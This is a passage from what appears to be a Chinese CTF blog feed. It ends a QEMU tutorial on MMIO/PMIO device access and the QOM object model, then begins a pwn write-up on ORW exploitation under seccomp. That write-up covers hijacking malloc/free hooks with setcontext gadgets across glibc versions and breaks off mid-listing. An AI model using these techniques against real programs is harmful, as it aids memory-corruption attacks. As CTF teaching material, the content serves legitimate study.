class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure><p>另一种就是常用的在用户态访问mmio空间，通过映射<code>resource0</code>文件实现内存的访问，实例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">        mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h2><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure><p>用户空间访问则需要先调用<code>iopl</code>函数申请访问端口，示例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure><h1 id="QOM编程模型"><a href="#QOM编程模型" class="headerlink" title="QOM编程模型"></a>QOM编程模型</h1><p>qemu提供了一套面向对象编程的模型–QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p><p>由于qemu模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解C++或其他面向对象语言来理解QOM。</p><p>有几个比较关键的结构体：<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。</p><p><code>TypeInfo</code>是用户用来定义一个<code>Type</code>的数据结构，用于定义了一个<code>TypeInfo</code>，然后调用<code>type_register(TypeInfo)</code>或者<code>type_register_static(TypeInfo)</code>函数，就会生成相应的<code>TypeImpl</code>实例，将这个<code>TypeInfo</code>注册到全局TypeImpl的<code>hash</code>表中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *parent;</span><br><span class="line">    <span class="keyword">size_t</span> instance_size;</span><br><span class="line">    <span class="keyword">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="keyword">bool</span> abstract;</span><br><span class="line">    <span class="keyword">size_t</span> class_size;</span><br><span class="line">    <span class="keyword">void</span> (*class_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_finalize)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> *class_data;</span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">size_t</span> class_size;  <span class="comment">/*该数据类型所代表的类的大小*/</span></span><br><span class="line">    <span class="keyword">size_t</span> instance_size;  <span class="comment">/*该数据类型产生的对象的大小*/</span></span><br><span class="line">    <span class="comment">/*类的 Constructor &amp; Destructor*/</span></span><br><span class="line">    <span class="keyword">void</span> (*class_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_finalize)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> *class_data;</span><br><span class="line">    <span class="comment">/*实例的Contructor &amp; Destructor*/</span></span><br><span class="line">    <span class="keyword">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="keyword">bool</span> abstract;  <span class="comment">/*表示类是否是抽象类*/</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *parent;  <span class="comment">/*父类的名字*/</span></span><br><span class="line">    TypeImpl *parent_type;  <span class="comment">/*指向父类TypeImpl的指针*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span>  <span class="comment">/*该类型对应的类的指针*/</span></span><br><span class="line">    <span class="keyword">int</span> num_interfaces;  <span class="comment">/*所实现的接口的数量*/</span></span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//其中InterfaceImpl的定义如下，只是一个类型的名字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">InterfaceImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">typename</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>TypeImpl</code>的属性与<code>TypeInfo</code>的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl对象。</p><p>如下面定义的<code>pci_test_dev</code>:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo pci_testdev_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_TEST_DEV,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(PCITestDevState),</span><br><span class="line">        .class_init    = pci_testdev_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register_static</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> type_register(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(info-&gt;parent);</span><br><span class="line">    <span class="keyword">return</span> type_register_internal(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> TypeImpl *<span class="title">type_register_internal</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = type_new(info);<span class="comment">//TypeInfo实例化成TypeImpl</span></span><br><span class="line">    type_table_add(ti);<span class="comment">//加入到TypeImpl中的hash表中</span></span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当所有qemu总线、设备等的<code>type_register_static</code>执行完成后，即它们的<code>TypeImpl</code>实例创建成功后，qemu就会在<code>type_initialize</code>函数中取实例化其对应的<code>ObjectClass</code>。</p><p>每个<code>Type</code>都有一个相应的<code>ObjectClass</code>所对应，其中<code>ObjectClass</code>是所有类的基类</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;  </span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用户可以定义自己的类，继承相应类即可：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span> *<span class="title">Type</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span> <span class="title">ObjectClass</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type&#x27;s instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> &#123;</span></span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>可以看到类的定义中父类都在第一个字段，使得可以父类与子类直接实现转换。一个类的初始化会先初始化它的父类，父类初始化完成后，会将相应字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值，同时也会继承父类相应的虚函数指针，当所有的父类都初始化结束后，<code>TypeInfo::class_init</code>就会调用以实现虚函数的初始化，如下例的<code>pci_testdev_class_init</code>所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_testdev_class_init</span><span class="params">(ObjectClass *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">        PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line">        k-&gt;init = pci_testdev_init;</span><br><span class="line">        k-&gt;<span class="built_in">exit</span> = pci_testdev_uninit;</span><br><span class="line">        ...</span><br><span class="line">        dc-&gt;desc = <span class="string">&quot;PCI Test Device&quot;</span>;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一个是<code>Object</code>对象：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="keyword">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>Object</code>对象为何物？<code>Type</code>以及<code>ObjectClass</code>只是一个类型，而不是具体的设备。<code>TypeInfo</code>结构体中有两个函数指针：<code>instance_init</code>以及<code>class_init</code>。<code>class_init</code>是负责初始化<code>ObjectClass</code>结构体的，<code>instance_init</code>则是负责初始化具体<code>Object</code>结构体的。</p><blockquote><p>the Object constructor and destructor functions (registered by the respective Objectclass constructors) will now only get called if the corresponding PCI device’s -device option was specified on the QEMU command line (unless, probably, it is a default PCI device for the machine).<br>Object类的构造函数与析构函数（在Objectclass构造函数中注册的）只有在命令中-device指定加载该设备后才会调用（或者它是该系统的默认加载PCI设备）。</p></blockquote><p><code>Object</code>示例如下所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Object</span> <span class="title">Object</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass *<span class="class"><span class="keyword">class</span>;</span> <span class="comment">/* points to the Type&#x27;s ObjectClass instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/qemu/typedefs.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> <span class="title">DeviceState</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> <span class="title">PCIDevice</span>;</span></span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Object parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> &#123;</span></span><br><span class="line">        DeviceState qdev;</span><br><span class="line">        ...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">YourDeviceState</span>&#123;</span></span><br><span class="line">        PCIDevice pdev;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>QOM会为设备Object分配<code>instace_size</code>大小的空间，然后调用<code>instance_init</code>函数（在Objectclass的class_init函数中定义）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>最后便是PCI的内存空间了，qemu使用<code>MemoryRegion</code>来表示内存空间，在<code>include/exec/memory.h</code>中定义。使用<code>MemoryRegionOps</code>结构体来对内存的操作进行表示，如<code>PMIO</code>或<code>MMIO</code>。对每个<code>PMIO</code>或<code>MMIO</code>操作都需要相应的<code>MemoryRegionOps</code>结构体，该结构体包含相应的<code>read/write</code>回调函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_mmio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_mmio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_pio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_pio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先使用<code>memory_region_init_io</code>函数初始化内存空间（<code>MemoryRegion</code>结构体），记录空间大小，注册相应的读写函数等；然后调用<code>pci_register_bar</code>来注册BAR等信息。需要指出的是无论是MMIO还是PMIO，其所对应的空间需要显示的指出（即静态声明或者是动态分配），因为<code>memory_region_init_io</code>只是记录空间大小而并不分配。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* hw/misc/pci-testdev.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_IOSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_MEMSIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCITestDevState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        PCIDevice parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">        MemoryRegion mmio;</span><br><span class="line">        MemoryRegion portio;</span><br><span class="line">        IOTest *tests;</span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">&#125; PCITestDevState;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br><span class="line">        memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;pci_testdev_mmio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-mmio&quot;</span>, IOTEST_MEMSIZE * <span class="number">2</span>); </span><br><span class="line">        memory_region_init_io(&amp;d-&gt;portio, OBJECT(d), &amp;pci_testdev_pio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-portio&quot;</span>, IOTEST_IOSIZE * <span class="number">2</span>); </span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);</span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;portio);</span><br></pre></td></tr></table></figure><p>可以在下面的链接中看看一个设备具体怎么实现的</p><p><a href="https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c">https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;qemu概述&quot;&gt;&lt;a href=&quot;#qemu概述&quot; class=&quot;headerlink&quot; title=&quot;qemu概述&quot;&gt;&lt;/a&gt;qemu概述&lt;/h1&gt;&lt;p&gt;运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>论ORW的多种利用姿势</title>
    <link href="https://billyotry.github.io/2021/05/29/%E8%AE%BAORW%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <id>https://billyotry.github.io/2021/05/29/%E8%AE%BAORW%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/</id>
    <published>2021-05-29T13:47:40.255Z</published>
    <updated>2021-06-03T13:25:37.319Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为ctf太卷了，现在比赛基本都会遇到沙盒，没办法，只能学一学，总结一下</p><h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><p>一般我们使用如下指令来查看沙箱</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./main</span><br></pre></td></tr></table></figure><p><code>system</code>函数是借用<code>execve</code>函数实现了，一般都是禁用了<code>execve</code>函数，所以<code>system</code>也没法用，所以一般的解法就是<strong>ORW</strong></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h3><p>在<code>Glibc2.29</code>以前的 ORW 解题思路已经比较清晰，主要是劫持<code>free_hook</code>或者<code>malloc_hook</code>写入<code>setcontext</code>函数中的<code>gadget</code>，通过<code>rdi</code>索引，来设置相关寄存器，并执行提前布置好的 ORW ROP chains</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;: ret</span><br></pre></td></tr></table></figure><h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><p>在<code>Glibc2.29</code>之后的<code>setcontext</code>中的<code>gadget</code>变成了以<code>rdx</code>为索引，因此如果按照之前的思路的话，还要先通过ROP控制RDX的值，如下所示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:00000000000580E4                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:00000000000580EB                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:00000000000580EF                 mov     r12, [rdx+48h]</span><br><span class="line">.text:00000000000580F3                 mov     r13, [rdx+50h]</span><br><span class="line">.text:00000000000580F7                 mov     r14, [rdx+58h]</span><br><span class="line">.text:00000000000580FB                 mov     r15, [rdx+60h]</span><br><span class="line">.text:00000000000580FF                 test    dword ptr fs:48h, 2</span><br><span class="line">    ....</span><br><span class="line">.text:00000000000581C6                 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:00000000000581CD                 push    rcx</span><br><span class="line">.text:00000000000581CE                 mov     rsi, [rdx+70h]</span><br><span class="line">.text:00000000000581D2                 mov     rdi, [rdx+68h]</span><br><span class="line">.text:00000000000581D6                 mov     rcx, [rdx+98h]</span><br><span class="line">.text:00000000000581DD                 mov     r8, [rdx+28h]</span><br><span class="line">.text:00000000000581E1                 mov     r9, [rdx+30h]</span><br><span class="line">.text:00000000000581E5                 mov     rdx, [rdx+88h]</span><br><span class="line">.text:00000000000581EC                 xor     eax, eax</span><br><span class="line">.text:00000000000581EE                 retn</span><br></pre></td></tr></table></figure><p>但如果搜索过相应gadgets的同学应该有感受， 很难找到能够直接控制rdx寄存器的gadgets，这时候就需要常备一些 <code>万金油</code>gadgets，具体的gadgets在下文结合题目解法一同介绍</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目链接：<a href="https://pan.baidu.com/s/1qFcnn8p4iWgJyOB_1sgAFw">https://pan.baidu.com/s/1qFcnn8p4iWgJyOB_1sgAFw</a></p><p>提取码：y895</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>漏洞点就是UAF了，剩下的其实就是堆风水的问题了，具体的细节就不说了，讲讲主要思路</p><h3 id="解法一-Gadget-setcontext"><a href="#解法一-Gadget-setcontext" class="headerlink" title="解法一 Gadget+setcontext"></a>解法一 Gadget+setcontext</h3><p>这其中用到的<code>gadget</code>如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00154930      mov     rdx, qword [rdi + 8]</span><br><span class="line">0x00154934      mov     qword [rsp], rax</span><br><span class="line">0x00154938      call    qword [rdx + 